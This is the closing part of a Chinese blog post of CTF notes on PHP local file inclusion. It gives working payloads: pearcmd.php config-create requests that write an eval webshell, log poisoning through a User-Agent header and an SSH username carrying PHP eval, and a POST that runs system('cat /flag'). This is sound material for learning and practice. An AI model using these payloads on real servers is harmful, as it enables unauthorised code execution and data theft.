+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/cmd.php</span><br></pre></td></tr></table></figure>
+<p>或</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pearcmd.php&amp;+config-create+/&lt;?=@eval($_POST[1]);die()?&gt;+shell7.php</span><br></pre></td></tr></table></figure>
+<p>最后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> ?file=/tmp/cmd </span><br><span class="line"> </span><br><span class="line">#post </span><br><span class="line">cmd=system (&quot;cat /flag&quot;); 即可。</span><br></pre></td></tr></table></figure>
+<h3 id="日志文件包含"><a class="markdownIt-Anchor" href="#日志文件包含"></a> 日志文件包含</h3>
+<p>一般来说，这种文件包含形式可以细分为两种 —— 中间件日志包含和 ssh 日志包含</p>
+<h4 id="中间件日志文件包含"><a class="markdownIt-Anchor" href="#中间件日志文件包含"></a> 中间件日志文件包含</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用条件：</span><br><span class="line"></span><br><span class="line">web 中间件日志文件的存储位置已知，并且具有可读权限</span><br></pre></td></tr></table></figure>
+<p>这个所谓的中间件，在平常的比赛中通常是 apache,nginx 服务器，当然</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">中间件可以是任何类型的软件，例如：</span><br><span class="line"></span><br><span class="line">消息队列系统（如 RabbitMQ、Apache Kafka）：允许应用程序异步交换数据和指令。</span><br><span class="line">Web 服务器（如 Apache, Nginx）：处理 HTTP 请求，并将它们路由到后台应用程序。</span><br><span class="line">数据库中间件：允许不同的数据库系统之间或应用程序与数据库之间的通信。</span><br><span class="line">应用服务器（如 Tomcat, WebLogic）：提供运行环境来部署、运行和管理 Web 应用程序。</span><br><span class="line">API 网关：管理微服务或服务导向架构中的 API 调用。</span><br></pre></td></tr></table></figure>
+<p>这种文件包含首先你得知道日志文件的路径，所以可以拿上面给的敏感路径试试，实在不知道可以通过先包含配置文件来确定日志文件路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/httpd</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br></pre></td></tr></table></figure>
+<h5 id="例题-2"><a class="markdownIt-Anchor" href="#例题-2"></a> 例题</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//WEB 手要懂得搜索</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    if(preg_match(&quot;/php|flag|data|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=/i&quot;, $file))&#123;</span><br><span class="line">        die(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了很多，伪协议近乎全军覆没，但是没有关系，我们可以使用日志包含。 发送请求 GET /?file=/var/log/nginx/access.log HTTP/1.1 发现回显出的结果存在 User-Agent 的内容，所以可在在这里进行命令执行。 由于 include 会把文件当成 php 文件执行，所以我们可以这样写：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=/var/log/nginx/access.log HTTP/1.1 </span><br><span class="line">Host: node5.anna.nssctf.cn:28449 </span><br><span class="line">Upgrade-Insecure-Requests: 1 </span><br><span class="line">User-Agent:  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 &lt;?php eval(&#x27;$_POST[&#x27;mima&#x27;]&#x27;);?&gt;</span><br><span class="line">Accept-Encoding: gzip, deflate </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>
+<p>这里 eval中不能用双引号，否则会和 index 文件中的 include 函数中的双引号起冲突。</p>
+<h4 id="ssh-日志文件包含"><a class="markdownIt-Anchor" href="#ssh-日志文件包含"></a> ssh 日志文件包含</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SSH 日志文件包含的利用条件是：</span><br><span class="line">SSH 日志路径已知，并且具有可读权限</span><br></pre></td></tr></table></figure>
+<p>SSH 如果开启了日志记录的功能，那么会将 ssh 的连接日志记录到 ssh 日志文件当中 将连接的用户名设置成恶意代码，用命令连接服务器 192.168.1.1 的 ssh 服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &quot;&lt;?php @eval($_POST[123]);?&gt;&quot;@192.168.1.1</span><br></pre></td></tr></table></figure>
+<p>查看日志文件 <code>/var/log/auth.log</code>，可以观察到恶意代码已经写入到日志文件</p>
+<p>测试输入语句： <code>http://192.168.1.1/xxx/file.php?file=../../../var/log/auth.log</code></p>
+<p>之后再向网页传入 POST 参数： <code>123=phpinfo</code></p>
+<p>就可以出现 phpinfo 的内容了</p>
+<h3 id="session-文件包含"><a class="markdownIt-Anchor" href="#session-文件包含"></a> session 文件包含</h3>
+<p>当可以获取 session 文件路径并且 session 文件的内容可控的的时候，就可以通过包含 session 文件进行攻击</p>
+<p><a target="_blank" rel="noopener" href="https://p1kap1.github.io/knowledge/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">ctf文件包含总结 - 杂谈小记 | Clear Mind = P1kap1 = 东隅已逝，桑榆非晚</a></p>
+<h3 id="临时文件包含"><a class="markdownIt-Anchor" href="#临时文件包含"></a> 临时文件包含</h3>
+<p><a target="_blank" rel="noopener" href="https://p1kap1.github.io/knowledge/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">ctf文件包含总结 - 杂谈小记 | Clear Mind = P1kap1 = 东隅已逝，桑榆非晚</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="ez include" class="lazyload">
+        
+        <a href="/2025/05/08/ez%20include/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            ez include
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/bizhi1.png" data-sizes="auto" alt="享受世界，快乐为先" class="lazyload">
+        
+      
+      <a href="/2025/05/07/%E4%BA%AB%E5%8F%97%E4%B8%96%E7%95%8C%EF%BC%8C%E5%BF%AB%E4%B9%90%E4%B8%BA%E5%85%88/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          享受世界，快乐为先
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        284k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        20:48
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#data%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.</span> <span class="toc-text"> Data伪协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.</span> <span class="toc-text"> 本地文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-number">2.1.</span> <span class="toc-text"> 敏感文件路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text"> 伪协议读文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#00-%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.2.1.</span> <span class="toc-text"> %00 截断文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.2.2.</span> <span class="toc-text"> 路径长度截断文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%82%B9%E5%8F%B7%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.2.3.</span> <span class="toc-text"> 点号截断文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A3%B8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABpearcmdphp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%86%99%E5%85%A5shell"><span class="toc-number">2.3.</span> <span class="toc-text"> 裸文件包含(pearcmd.php文件包含写入shell)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.3.1.</span> <span class="toc-text"> 利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">2.3.2.</span> <span class="toc-text"> 例题：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.4.</span> <span class="toc-text"> 日志文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.4.1.</span> <span class="toc-text"> 中间件日志文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-2"><span class="toc-number">2.4.1.1.</span> <span class="toc-text"> 例题</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.4.2.</span> <span class="toc-text"> ssh 日志文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.5.</span> <span class="toc-text"> session 文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.6.</span> <span class="toc-text"> 临时文件包含</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">186</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">179</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "文件包含小tip",
+          url: "http://example.com/2025/05/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B0%8Ftip/",
+          excerpt: "",
+          description: "",
+          stripContent: "转载自ctf文件包含总结 - 杂谈小记 | Clear Mind = P1kap1 = 东隅已逝，桑榆非晚  Data伪协议 123456789101112data:,&amp;lt;文本数据&amp;gt;  data:text/plain,&amp;lt;文本数据&amp;gt;  data:text/html,&amp;lt;HTML代码&amp;gt;  data:text/html;base64,&amp;lt;base64编码的HTML代码&amp;gt;  data:text/css,&amp;lt;CSS代码&amp;gt;  data:text/css;b",
+          date: "Thu May 08 2025 15:26:17 GMT+0800",
+          updated: "Thu Sep 18 2025 11:00:23 GMT+0800",
+          cover: "/../images/1737907114de8a.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
